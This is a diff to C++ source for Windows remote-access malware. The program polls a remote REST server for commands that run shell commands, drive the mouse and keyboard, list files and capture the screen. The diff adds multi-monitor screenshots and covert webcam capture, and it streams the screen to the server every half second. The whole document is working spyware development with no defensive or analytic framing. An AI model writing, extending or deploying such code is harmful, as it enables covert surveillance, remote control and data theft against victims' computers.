@@ -5,11 +5,13 @@
 #include <sstream>
 #include <vector>
 #include <gdiplus.h>
+#include <vfw.h>
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "vfw32.lib")
 using namespace Gdiplus;
 
 std::string computerName;
@@ -129,16 +131,36 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
     return -1;
 }
 
-std::string takeScreenshot() {
-    int w = GetSystemMetrics(SM_CXSCREEN);
-    int h = GetSystemMetrics(SM_CYSCREEN);
-    int sw = w, sh = h;
+struct MonInfo{int x,y,w,h;};
+int enumMon(HMONITOR m, HDC, RECT* r, LPARAM lp){
+    std::vector<MonInfo>* v=(std::vector<MonInfo>*)lp;
+    v->push_back({r->left,r->top,r->right-r->left,r->bottom-r->top});
+    return 1;
+}
+std::vector<MonInfo> getMonitors(){
+    std::vector<MonInfo> v;
+    EnumDisplayMonitors(0,0,enumMon,(LPARAM)&v);
+    return v;
+}
+
+std::string takeScreenshot(int monitorIdx) {
+    auto mons=getMonitors();
+    int x=0,y=0,w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);
+    if(monitorIdx>=0&&monitorIdx<(int)mons.size()){
+        x=mons[monitorIdx].x; y=mons[monitorIdx].y;
+        w=mons[monitorIdx].w; h=mons[monitorIdx].h;
+    } else if(monitorIdx==-1){
+        x=GetSystemMetrics(SM_XVIRTUALSCREEN);
+        y=GetSystemMetrics(SM_YVIRTUALSCREEN);
+        w=GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        h=GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    }
     HDC hScreen = GetDC(0);
     HDC hMem = CreateCompatibleDC(hScreen);
-    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, sw, sh);
+    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
     SelectObject(hMem, hBmp);
     SetStretchBltMode(hMem, COLORONCOLOR);
-    StretchBlt(hMem, 0, 0, sw, sh, hScreen, 0, 0, w, h, SRCCOPY);
+    BitBlt(hMem, 0, 0, w, h, hScreen, x, y, SRCCOPY);
     Bitmap bmp(hBmp, NULL);
     CLSID jpegClsid;
     GetEncoderClsid(L"image/jpeg", &jpegClsid);
@@ -156,6 +178,36 @@ std::string takeScreenshot() {
     istream->Release();
     DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(0, hScreen);
     return base64Encode(data.data(), data.size());
+}
+
+std::string captureWebcam() {
+    HWND hWndC = capCreateCaptureWindowA("Cap", WS_CHILD|WS_VISIBLE,0,0,320,240,0,0);
+    if(!hWndC) return "";
+    if(!capDriverConnect(hWndC,0)){DestroyWindow(hWndC);return "";}
+    capGrabFrameNoStop(hWndC);
+    Sleep(200);
+    capEditCopy(hWndC);
+    std::string result;
+    if(OpenClipboard(0)){
+        HBITMAP hBmp=(HBITMAP)GetClipboardData(CF_BITMAP);
+        if(hBmp){
+            Bitmap bmp(hBmp,NULL);
+            CLSID jpegClsid; GetEncoderClsid(L"image/jpeg",&jpegClsid);
+            IStream* is=0; CreateStreamOnHGlobal(0,TRUE,&is);
+            bmp.Save(is,&jpegClsid,0);
+            STATSTG st; is->Stat(&st,STATFLAG_NONAME);
+            ULONG sz=(ULONG)st.cbSize.LowPart;
+            std::vector<unsigned char> d(sz);
+            LARGE_INTEGER li={}; is->Seek(li,STREAM_SEEK_SET,0);
+            ULONG r=0; is->Read(d.data(),sz,&r); is->Release();
+            result=base64Encode(d.data(),d.size());
+            DeleteObject(hBmp);
+        }
+        CloseClipboard();
+    }
+    capDriverDisconnect(hWndC);
+    DestroyWindow(hWndC);
+    return result;
 }
 
 std::string execCmd(const std::string& cmd) {
@@ -311,7 +363,9 @@ DWORD WINAPI pollThread(LPVOID) {
             std::string result = "";
             try {
                 if (type == "screenshot") {
-                    result = takeScreenshot();
+                    int mi=0;
+                    try{mi=std::stoi(payload);}catch(...){}
+                    result = takeScreenshot(mi);
                 } else if (type == "cmd") {
                     result = execCmd(payload.empty() ? "whoami" : payload);
                 } else if (type == "mouse") {
@@ -319,7 +373,9 @@ DWORD WINAPI pollThread(LPVOID) {
                 } else if (type == "keyboard") {
                     result = handleKeyboard(payload);
                 } else if (type == "screen") {
-                    result = takeScreenshot();
+                    result = takeScreenshot(0);
+                } else if (type == "webcam") {
+                    result = captureWebcam();
                 } else if (type == "file_list") {
                     result = listDir(payload.empty() ? "" : payload);
                 } else {
@@ -335,33 +391,24 @@ DWORD WINAPI pollThread(LPVOID) {
 }
 
 DWORD WINAPI screenThread(LPVOID) {
-    Sleep(5000);
-    std::string cmdId;
-    bool hasCmd=false;
-    int frameCount=0;
+    Sleep(3000);
+    int fc=0;
     while(true) {
-        Sleep(350);
+        Sleep(500);
         try {
-            std::string b64 = takeScreenshot();
+            std::string b64 = takeScreenshot(0);
             std::string escaped = jsonEscape(b64);
-            if(!hasCmd){
-                std::string body = "{\"computer\":\"" + computerName + "\",\"type\":\"screen_live\",\"payload\":\"\",\"status\":\"done\",\"result\":\"" + escaped + "\"}";
-                std::string resp = httpsPost("/rest/v1/commands", body);
-                cmdId = extractJson(resp, "id");
-                hasCmd = !cmdId.empty();
-                if(!hasCmd){
-                    std::string searchPath = "/rest/v1/commands?computer=eq." + computerName + "&type=eq.screen_live&order=id.desc&limit=1";
-                    resp = httpsGet(searchPath);
-                    cmdId = extractJson(resp, "id");
-                    hasCmd = !cmdId.empty();
+            std::string body = "{\"computer\":\"" + computerName + "\",\"type\":\"screen_live\",\"payload\":\"\",\"status\":\"done\",\"result\":\"" + escaped + "\"}";
+            httpsPost("/rest/v1/commands", body);
+            fc++;
+            if(fc%20==0){
+                std::string all = httpsGet("/rest/v1/commands?computer=eq." + computerName + "&type=eq.screen_live&order=id.desc&limit=50");
+                if(!all.empty()&&all!="[]"){
+                    std::string latestId = extractJson(all, "id");
+                    if(!latestId.empty()){
+                        httpsDelete("/rest/v1/commands?computer=eq." + computerName + "&type=eq.screen_live&id=neq." + latestId);
+                    }
                 }
-            } else {
-                std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
-                httpsPatch("/rest/v1/commands?id=eq." + cmdId, resBody);
-            }
-            frameCount++;
-            if(frameCount%200==0&&hasCmd){
-                httpsDelete("/rest/v1/commands?computer=eq." + computerName + "&type=eq.screen_live&id=neq." + cmdId);
             }
         } catch(...) {}
     }
